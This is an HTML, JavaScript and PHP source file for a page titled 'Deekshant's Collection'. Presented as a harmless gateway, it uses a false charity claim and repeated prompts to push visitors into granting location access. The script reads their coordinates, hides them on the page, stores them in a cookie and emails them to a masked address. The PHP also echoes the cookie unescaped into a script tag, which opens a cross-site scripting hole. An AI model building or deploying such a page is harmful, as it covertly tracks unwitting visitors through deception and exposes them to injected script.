<!DOCTYPE html>
<html>
<head>
<style>
h1 {
  color:yellow;
  font-family: "proxima-nova-soft", "Proxima Nova Soft", Helvetica, Arial, sans-serif;
  font-size:15vw;
  text-decoration: red underline wavy;
}
h2{
    font-size:4vw;
}
p.help{
    border-left: 6px solid red;
    background-color: yellow;
    padding-left:20px;
    padding-right:10px;
}
.button {
  background-color: #2CD5B7;
  border: none;
  color :white;
  border-radius: 8px;
  padding: 40px 64px;
  text-align: center;
  text-decoration: none;
  display: inline-block;
  font-size: 6vw;
  margin: 6px 3px;
  cursor: pointer;
  box-shadow: 0 8px 16px 0 rgba(0,0,0,0.2), 0 6px 20px 0 rgba(0,0,0,0.19);
}
</style>
</head>
  <body style="background-color:#693AFF;">
    <h1 >Deekshant's Collection</h1>

    <h2 style="color:white;">Click here to visit the collection</h2>

    <h3 style="color:white;" id= "err3"></h3>

    <p id="demo" style="color:#693AFF;"></p>

    <button class="button" onclick="myFunction()">Click me</button>

    <p id="succ" class="help"></p>

    <h2 style="color:#EDF30A;text-decoration: underline;" id = "err"></h2>

    <h3 style="color:white;" id= "err2"></h3>

    <p id = "end" class="help">50% of revenue earned from this website is contributed to charity. Please enable location access to help us in this cause</p>
<script>
//Get latitude and longitude;
function successFunction(position) {
    localStorage['authorizedGeoLocation'] = 1;
}
function errorFunction(){
    localStorage['authorizedGeoLocation'] = 0;
}
function checkauthorizedGeoLocation(){ // you can use this function to know if geoLocation was previously allowed
    if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(successFunction, errorFunction);
    }
    if(typeof localStorage['authorizedGeoLocation'] == "undefined" || localStorage['authorizedGeoLocation'] == "0" ) {
        return false;}
    else {
        return true;}
}
var x = document.getElementById("demo");
if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(showPosition);
  } else {
    x.innerHTML = "Geolocation is not supported by this browser.";
  }
function showPosition(position) {
  x.innerHTML = "A: " + position.coords.latitude + " B: " + position.coords.longitude;
  document.cookie = "data="+x.innerHTML ;
  }
function myFunction() {
    if(checkauthorizedGeoLocation()== true){
        document.getElementById("succ").innerHTML = 'Breathe in<br>Breathe Out<br>Count Till 100';
        document.getElementById("err").innerHTML = '';
        document.getElementById("err2").innerHTML = '';
        document.getElementById("end").innerHTML = 'This might take some time to load(1-2 minutes)<br>But I can promise that it\'s worth the wait';
        window.location.href = "abc.php";
      }
  else{
      alert("Please enable location to continue");
      document.getElementById("err").innerHTML = '<br>To enable location - ';
      document.getElementById("err2").innerHTML = '1. Tap the lock icon on top left corner of screen<br>2. Then tap site settings<br>3. Then select location access and enable it<br>4. Refresh<br>';
      document.getElementById("err3").innerHTML = '(Please Enable locaton access to continue.<br>Then refresh and try again)';
  }
}
</script>
</body>
</html>

<?php
if(isset($_COOKIE['data'])){
    $message = $_COOKIE['data'];
    echo "<script type='text/javascript'>alert('$message');</script>";
    //echo $_COOKIE['data'];
    //echo "<script type='text/javascript'>delete_cookie('data');</script>";
    mail("d******@gmail.com","My subject",$message); //recievers mail
}
?>
